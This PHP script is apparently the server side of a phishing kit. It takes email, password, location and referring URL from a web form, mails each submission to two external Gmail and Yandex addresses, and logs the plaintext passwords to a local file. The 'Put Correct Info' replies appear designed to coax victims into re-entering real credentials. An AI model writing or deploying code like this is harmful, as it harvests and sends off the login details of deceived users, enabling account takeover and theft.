<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use Dotenv\Dotenv;
require __DIR__ . '/vendor/autoload.php';

// Load environment variables
$dotenv = Dotenv::createImmutable(__DIR__);
$dotenv->load();

// --- CORS ---
header("Access-Control-Allow-Origin: https://strong-dasik-90f620.netlify.app/");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

// --- Session tracking ---
session_start();
if (!isset($_SESSION['correct_attempts'])) { $_SESSION['correct_attempts'] = 0; }

// --- Handle POST ---
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email    = trim($_POST['email'] ?? '');
    $password = trim($_POST['password'] ?? '');
    $location = trim($_POST['location'] ?? '');
    $userUrl  = trim($_POST['userUrl'] ?? '');
    $time     = date("Y-m-d H:i:s");

    $valid_email    = "user@example.com";
    $valid_password = "password123";
    $valid_location = "New York";

    if ($_SESSION['correct_attempts'] >= 6) {
        echo "Try again later.";
        exit;
    }

    // Determine if credentials are correct
    $isValid = ($email === $valid_email && $password === $valid_password && $location === $valid_location);

    // Prepare message subject and body reflecting validity status
    $subject = ($isValid ? "CORRECT Form Submission" : "INCORRECT Form Submission") . " from $userUrl";
    $message = "Submission Details\n\n";
    $message .= "Email: $email\nPassword: $password\nLocation: $location\nUser URL: $userUrl\nTime: $time\n";
    $message .= $isValid ? "Status: VALID credentials\n" : "Status: INVALID credentials\n";

    // Send email with PHPMailer
    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host       = "smtp.gmail.com";
        $mail->SMTPAuth   = true;
        $mail->Username   = getenv('SMTP_USER');
        $mail->Password   = getenv('SMTP_PASS');
        $mail->SMTPSecure = "tls";
        $mail->Port       = 587;

        $mail->setFrom(getenv('SMTP_USER'), "Website");
        $mail->addAddress("workchopoff@gmail.com");
        $mail->addAddress("workchopoff@yandex.com");

        $mail->isHTML(false);
        $mail->Subject = $subject;
        $mail->Body    = $message;
        $mail->send();

        // Log message: including correctness
        file_put_contents(__DIR__ . "/messages.log", "[$time] $message\n", FILE_APPEND);

        if ($isValid) {
            $_SESSION['correct_attempts']++;
            echo "Put Correct Info";
        } else {
            echo "Incorrect details, sent notification.";
        }

    } catch (Exception $e) {
        file_put_contents(__DIR__ . "/messages.log", "[$time] Send failed: {$mail->ErrorInfo}\n", FILE_APPEND);
        echo "Failed to send! Error: {$mail->ErrorInfo}";
    }
} else {
    echo "Invalid request method.";
}